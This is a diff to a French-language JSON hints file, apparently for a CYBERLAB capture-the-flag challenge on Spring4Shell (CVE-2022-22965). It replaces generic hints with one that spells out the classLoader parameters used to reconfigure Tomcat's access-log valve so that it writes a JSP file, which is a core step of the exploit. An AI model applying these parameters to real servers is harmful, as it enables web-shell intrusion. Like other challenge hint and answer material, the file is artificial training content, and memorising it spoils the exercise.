@@ -1,12 +1,7 @@
 [
   {
-    "title": "Indice 1 : Vecteur d'attaque",
-    "cost": 15,
-    "content": "Recherche la documentation officielle et les techniques éprouvées pour exploiter spring4shell-cve."
-  },
-  {
-    "title": "Indice 2 : Format du drapeau",
+    "title": "Paramètres du Valve",
     "cost": 25,
-    "content": "Le drapeau respecte le format standard : CYBERLAB{...}."
+    "content": "Injecte class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bk%7Di et class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
   }
 ]
